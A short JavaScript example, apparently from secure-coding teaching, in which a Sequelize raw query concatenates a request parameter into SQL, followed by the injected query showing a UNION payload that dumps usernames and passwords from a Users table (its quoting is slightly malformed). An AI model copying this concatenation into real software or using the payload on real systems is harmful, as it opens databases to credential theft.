function findItems(req, resp)
{
  try {
    // Find the relevant items
    sequelize.query(
      "SELECT Desc FROM Items WHERE Desc like ('%" + req.params.snippet + "%')",
      { type: sequelize.QueryTypes.SELECT}
    ) // Retrieve results
    .spread(function(results, metadata) {
        // Add results to response
     });
  } catch {
    // Handle error
  }
}


'SELECT Desc FROM Items WHERE Desc like ('%') UNION SELECT username||'_'||password FROM Users '-- %) 